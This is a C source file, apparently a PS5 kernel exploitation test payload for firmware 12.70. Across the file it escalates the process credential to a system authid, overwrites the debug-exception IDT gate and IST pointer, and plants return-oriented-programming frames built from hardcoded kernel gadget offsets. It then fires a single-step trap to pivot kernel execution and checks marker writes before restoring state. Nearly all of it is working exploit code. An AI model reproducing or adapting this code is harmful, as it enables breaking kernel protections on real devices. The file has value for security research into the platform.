#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/cpuset.h>
#include <unistd.h>

#include <ps5/kernel.h>
#include <ps5/klog.h>

#include "kdlsym.h"
#include "util.h"

#define FW_1270          0x12700000U
#define SYSTEM_AUTHID    0x4800000000000007ULL
#define PCPU_ARRAY_OFF   0x2e9cf00ULL
#define PIVOT_OFF        0x2a815eULL
#define POP_RAX_OFF      0xc9fbf4ULL
#define RET_TRAMP_OFF    0xc9fbf5ULL
#define DBREG_OFF        0x2ac9f8ULL
#define POP_RCX_OFF      0x3410d2ULL
#define POP_RSI_OFF      0x2f5cb0ULL
#define POP_RDX_OFF      0x34f4ebULL
#define POP_R8_OFF       0x7dedbfULL
#define POP_RSP_OFF      0x341462ULL
#define STORE_RCX_R8_OFF 0x51e699ULL
#define STORE_RCX_RAX_OFF 0x369defULL
#define SET_DR7_OFF      0xa95a96ULL
#define KSTUFF_IRET_OFF  0x2b34adULL
#define CANDIDATE_IRET_OFF 0x272467ULL
#ifdef PIVOT_CANDIDATE_IRET_1270
#define TEST_IRET_OFF CANDIDATE_IRET_OFF
#else
#define TEST_IRET_OFF KSTUFF_IRET_OFF
#endif
#define IST6_OFF         0x4cULL
#define VEC_DB           1
#define KERNEL_CS        0x20
#define USER_CS          0x43
#define USER_SS          0x3b
#define USER_RFLAGS      0x202ULL

static int read_q(uint64_t addr, uint64_t *value)
{
  *value = 0;
  return kernel_copyout((intptr_t)addr, value, sizeof(*value));
}

static int write_q(uint64_t addr, uint64_t value)
{
  return kernel_copyin(&value, (intptr_t)addr, sizeof(value));
}

static void gate_encode(uint64_t handler, uint64_t *lo, uint64_t *hi)
{
  *lo = (handler & 0xffffULL) |
        ((uint64_t)KERNEL_CS << 16) |
        ((uint64_t)6 << 32) |
        ((uint64_t)0xe << 40) |
        ((uint64_t)1 << 47) |
        (((handler >> 16) & 0xffffULL) << 48);
  *hi = (handler >> 32) & 0xffffffffULL;
}

static int fire(uint64_t rip_slot, uint64_t rsp_slot, uint64_t context)
{
  uint64_t resume_rsp = 0;
  void *resume_rip = &&resumed;
  __asm__ volatile("mov %%rsp, %0" : "=r"(resume_rsp));
  if (write_q(rip_slot, (uint64_t)resume_rip) != 0 ||
      write_q(rsp_slot, resume_rsp) != 0)
    return -1;

#if defined(PIVOT_DBREG_1270) || defined(PIVOT_DBREG_CONT_1270)
  uint64_t resume_rbp = 0;
  __asm__ volatile("mov %%rbp, %0" : "=r"(resume_rbp));
  if (write_q(context + 0x20, resume_rbp) != 0)
    return -2;
  __asm__ volatile(
      "mov %[ctx], %%rdi    \n\t"
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      : : [ctx] "r"(context) : "rdi", "memory", "cc");
#else
  (void)context;
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      ::: "memory", "cc");
#endif
resumed:
  return 0;
}

int main(void)
{
  uint32_t fw = kernel_get_fw_version();
  if ((fw & 0xffff0000U) != FW_1270) {
    klog("PIVOT1270,1,stop,stage=firmware,fw=0x%08x\n", fw);
    return 2;
  }

  uint64_t original_authid = kernel_get_ucred_authid(getpid());
  if (kernel_set_ucred_authid(getpid(), SYSTEM_AUTHID) != 0 ||
      pin_to_core(0) != 0) {
    klog("PIVOT1270,1,stop,stage=pin\n");
    kernel_set_ucred_authid(getpid(), original_authid);
    return 3;
  }

  intptr_t thread = kernel_get_proc_thread(getpid(), -1);
  uint64_t row_thread = 0;
  uint64_t pcpu_row0 = (uint64_t)KERNEL_ADDRESS_DATA_BASE + PCPU_ARRAY_OFF;
  if (!thread || read_q(pcpu_row0, &row_thread) != 0 ||
      row_thread != (uint64_t)thread) {
    klog("PIVOT1270,1,stop,stage=wrong-tss-row,reported=%d,"
         "thread=0x%016" PRIx64 ",row=0x%016" PRIx64 "\n",
         get_cpu_core(), (uint64_t)thread, row_thread);
    kernel_set_ucred_authid(getpid(), original_authid);
    return 4;
  }

  uint64_t text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + VEC_DB * 16;
  uint64_t ist = kdlsym(KERNEL_SYM_COMMON_TSS) + IST6_OFF;
  uint64_t arm = cave + 0x40;
  uint64_t old_gate_lo = 0, old_gate_hi = 0, old_ist = 0;
  uint8_t old_scratch[0x200] = {0};
#if defined(PIVOT_DBREG_1270) || defined(PIVOT_DBREG_CONT_1270)
  const uint64_t context = cave + 0x140;
#ifdef PIVOT_DBREG_CONT_1270
  const uint64_t marker_addr = cave + 0x1f0;
  const uint64_t marker_value = 0x1270c0de5eedbabeULL;
  uint64_t frame[23] = {0};
  frame[0] = text + POP_RAX_OFF;
  frame[1] = text + RET_TRAMP_OFF;
  frame[2] = text + DBREG_OFF;
  frame[12] = text + POP_RCX_OFF;
  frame[13] = marker_addr;
#ifdef PIVOT_CONT_ALT_1270
  frame[14] = text + POP_RAX_OFF;
  frame[16] = text + STORE_RCX_RAX_OFF;
#else
  frame[14] = text + POP_R8_OFF;
  frame[16] = text + STORE_RCX_R8_OFF;
#endif
  frame[15] = marker_value;
  frame[17] = text + TEST_IRET_OFF;
  frame[19] = USER_CS;
  frame[20] = USER_RFLAGS;
  frame[22] = USER_SS;
  const uint64_t rip_slot = arm + 18 * 8;
  const uint64_t rsp_slot = arm + 21 * 8;
#else
  uint64_t frame[18] = {0};
  frame[0] = text + POP_RAX_OFF;
  frame[1] = text + RET_TRAMP_OFF;
  frame[2] = text + DBREG_OFF;
  frame[12] = text + TEST_IRET_OFF;
  frame[14] = USER_CS;
  frame[15] = USER_RFLAGS;
  frame[17] = USER_SS;
  const uint64_t rip_slot = arm + 0x68;
  const uint64_t rsp_slot = arm + 0x80;
#endif
#elif defined(PIVOT_POP_RAX_1270)
  uint64_t frame[8] = {text + POP_RAX_OFF, 0x1270a55a1270a55aULL,
                       text + TEST_IRET_OFF, 0, USER_CS,
                       USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 24;
  const uint64_t rsp_slot = arm + 48;
  const uint64_t context = 0;
#elif defined(PIVOT_FIRST_POP_1270)
  uint64_t frame[8] = {text + PIVOT_FIRST_POP_OFF,
                       0x1270a55a1270a55aULL,
                       text + TEST_IRET_OFF, 0, USER_CS,
                       USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 24;
  const uint64_t rsp_slot = arm + 48;
  const uint64_t context = 0;
#elif defined(PIVOT_STORE_RCX_RAX_1270)
  const uint64_t marker_addr = cave + 0x1f0;
  const uint64_t marker_value = 0x1270c0de5eedbabeULL;
  uint64_t frame[11] = {text + POP_RCX_OFF, marker_addr,
                        text + POP_RAX_OFF, marker_value,
                        text + STORE_RCX_RAX_OFF,
                        text + TEST_IRET_OFF, 0, USER_CS,
                        USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 48;
  const uint64_t rsp_slot = arm + 72;
  const uint64_t context = 0;
#elif defined(PIVOT_SET_DR7_1270)
  uint64_t frame[9] = {text + POP_RAX_OFF, 0,
                       text + SET_DR7_OFF, text + TEST_IRET_OFF,
                       0, USER_CS, USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 32;
  const uint64_t rsp_slot = arm + 56;
  const uint64_t context = 0;
#elif defined(PIVOT_POP_PAIR_1270)
  uint64_t frame[10] = {text + POP_RSI_OFF, 0x1270a55a1270a55aULL,
                        text + POP_RDX_OFF, 0x1270b66b1270b66bULL,
                        text + TEST_IRET_OFF, 0, USER_CS,
                        USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 40;
  const uint64_t rsp_slot = arm + 64;
  const uint64_t context = 0;
#elif defined(PIVOT_POP_RSP_1270)
  const uint64_t tramp_addr = cave + 0x180;
  uint64_t frame[2] = {text + POP_RSP_OFF, tramp_addr};
  uint64_t tramp[6] = {text + TEST_IRET_OFF, 0, USER_CS,
                       USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = tramp_addr + 8;
  const uint64_t rsp_slot = tramp_addr + 32;
  const uint64_t context = 0;
#else
  uint64_t frame[6] = {text + TEST_IRET_OFF, 0, USER_CS,
                       USER_RFLAGS, 0, USER_SS};
  const uint64_t rip_slot = arm + 8;
  const uint64_t rsp_slot = arm + 32;
  const uint64_t context = 0;
#endif
  int result = 5, modified = 0;
#ifdef PIVOT_PREP_ONLY_1270
  (void)rip_slot;
  (void)rsp_slot;
  (void)context;
#endif

  if (read_q(gate, &old_gate_lo) != 0 ||
      read_q(gate + 8, &old_gate_hi) != 0 ||
      read_q(ist, &old_ist) != 0 ||
      kernel_copyout((intptr_t)cave, old_scratch, sizeof(old_scratch)) != 0 ||
      ((old_gate_lo >> 47) & 1) != 1 ||
      ((old_gate_lo >> 40) & 0xf) != 0xe ||
      ((old_gate_lo >> 16) & 0xffff) != KERNEL_CS || old_ist != 0) {
    klog("PIVOT1270,1,stop,stage=preflight,gate=0x%016" PRIx64
         ",ist=0x%016" PRIx64 "\n", old_gate_lo, old_ist);
    goto cleanup;
  }

  klog("PIVOT1270,1,start,fw=0x%08x,reported_cpu=%d,tss_row=0,"
       "pivot=0x%016" PRIx64 ",iret=0x%016" PRIx64
       ",first=0x%016" PRIx64 "\n",
       fw, get_cpu_core(), text + PIVOT_OFF, text + TEST_IRET_OFF,
       frame[0]);
  if (kernel_copyin(frame, (intptr_t)arm, sizeof(frame)) != 0) {
    klog("PIVOT1270,1,stop,stage=frame-write\n");
    goto cleanup;
  }
  modified = 1;

  uint64_t frame_readback[sizeof(frame) / sizeof(frame[0])] = {0};
  if (kernel_copyout((intptr_t)arm, frame_readback,
                     sizeof(frame_readback)) != 0 ||
      __builtin_memcmp(frame, frame_readback, sizeof(frame)) != 0) {
    klog("PIVOT1270,1,stop,stage=frame-readback\n");
    goto cleanup;
  }
#ifdef PIVOT_POP_RSP_1270
  uint64_t tramp_readback[6] = {0};
  if (kernel_copyin(tramp, (intptr_t)tramp_addr, sizeof(tramp)) != 0 ||
      kernel_copyout((intptr_t)tramp_addr, tramp_readback,
                     sizeof(tramp_readback)) != 0 ||
      __builtin_memcmp(tramp, tramp_readback, sizeof(tramp)) != 0) {
    klog("PIVOT1270,1,stop,stage=tramp-write\n");
    goto cleanup;
  }
#endif
#if defined(PIVOT_DBREG_1270) || defined(PIVOT_DBREG_CONT_1270)
  uint64_t resume_ctx[0xa8 / sizeof(uint64_t)] = {0};
  uint64_t readback_ctx_rsp = 0, readback_ctx_rip = 0,
           readback_ctx_dr7 = UINT64_MAX;
  resume_ctx[0x28 / 8] = cave + 0xa0 - 8;
  resume_ctx[0x38 / 8] = text + RET_TRAMP_OFF;
  klog("PIVOT1270,1,dbreg,entry=0x%016" PRIx64
       ",context=0x%016" PRIx64 ",resume_rsp=0x%016" PRIx64
       ",resume_rip=0x%016" PRIx64 ",dr7=0\n",
       text + DBREG_OFF, context, resume_ctx[0x28 / 8],
       resume_ctx[0x38 / 8]);
  if (kernel_copyin(resume_ctx, (intptr_t)context, sizeof(resume_ctx)) != 0 ||
      read_q(context + 0x28, &readback_ctx_rsp) != 0 ||
      read_q(context + 0x38, &readback_ctx_rip) != 0 ||
      read_q(context + 0xa0, &readback_ctx_dr7) != 0 ||
      readback_ctx_rsp != resume_ctx[0x28 / 8] ||
      readback_ctx_rip != resume_ctx[0x38 / 8] ||
      readback_ctx_dr7 != 0) {
    klog("PIVOT1270,1,stop,stage=context-write\n");
    goto cleanup;
  }
#endif

  uint64_t new_lo = 0, new_hi = 0;
  gate_encode(text + PIVOT_OFF, &new_lo, &new_hi);
  if (write_q(ist, arm) != 0 ||
      write_q(gate + 8, new_hi) != 0 ||
      write_q(gate, new_lo) != 0) {
    klog("PIVOT1270,1,stop,stage=hook-write\n");
    goto cleanup;
  }
  uint64_t readback_lo = 0, readback_hi = 0, readback_ist = 0;
  if (read_q(gate, &readback_lo) != 0 ||
      read_q(gate + 8, &readback_hi) != 0 ||
      read_q(ist, &readback_ist) != 0 ||
      readback_lo != new_lo || readback_hi != new_hi ||
      readback_ist != arm) {
    klog("PIVOT1270,1,stop,stage=hook-readback\n");
    goto cleanup;
  }

#ifdef PIVOT_PREP_ONLY_1270
  klog("PIVOT1270,1,prepare-only,hook-readback=ok\n");
  result = 0;
#else
  klog("PIVOT1270,1,before-trigger\n");
  result = fire(rip_slot, rsp_slot, context);
  klog("PIVOT1270,1,after-trigger,result=%d\n", result);
#ifdef PIVOT_DBREG_CONT_1270
  uint64_t marker_observed = 0;
  int marker_read = read_q(marker_addr, &marker_observed);
  klog("PIVOT1270,1,marker,read=%d,observed=0x%016" PRIx64
       ",expected=0x%016" PRIx64 "\n",
       marker_read, marker_observed, marker_value);
  if (marker_read != 0 || marker_observed != marker_value)
    result = 9;
#endif
#ifdef PIVOT_STORE_RCX_RAX_1270
  uint64_t marker_observed = 0;
  int marker_read = read_q(marker_addr, &marker_observed);
  klog("PIVOT1270,1,marker,read=%d,observed=0x%016" PRIx64
       ",expected=0x%016" PRIx64 "\n",
       marker_read, marker_observed, marker_value);
  if (marker_read != 0 || marker_observed != marker_value)
    result = 9;
#endif
#endif

cleanup:
  if (modified) {
    int gate_hi_restore = write_q(gate + 8, old_gate_hi);
    int gate_lo_restore = write_q(gate, old_gate_lo);
    int ist_restore = write_q(ist, old_ist);
    int scratch_restore = kernel_copyin(old_scratch, (intptr_t)cave,
                                         sizeof(old_scratch));
    uint64_t restored_lo = 0, restored_hi = 0, restored_ist = 0;
    int restore_readback = read_q(gate, &restored_lo) ||
                           read_q(gate + 8, &restored_hi) ||
                           read_q(ist, &restored_ist) ||
                           restored_lo != old_gate_lo ||
                           restored_hi != old_gate_hi ||
                           restored_ist != old_ist;
    klog("PIVOT1270,1,restore,gate=%d/%d,ist=%d,scratch=%d\n",
         gate_hi_restore, gate_lo_restore, ist_restore, scratch_restore);
    klog("PIVOT1270,1,restore-readback,result=%d\n", restore_readback);
    if (gate_hi_restore || gate_lo_restore || ist_restore || scratch_restore ||
        restore_readback)
      result = 6;
  }
  uint64_t all_mask[2] = {0xffff, 0};
  int affinity_restore = cpuset_setaffinity(3, 1, -1, sizeof(all_mask),
                                           (const cpuset_t *)all_mask);
  int authid_restore = kernel_set_ucred_authid(getpid(), original_authid);
  klog("PIVOT1270,1,end,result=%d,affinity_restore=%d,authid_restore=%d\n",
       result, affinity_restore, authid_restore);
  return result == 0 && affinity_restore == 0 && authid_restore == 0 ? 0 : 7;
}
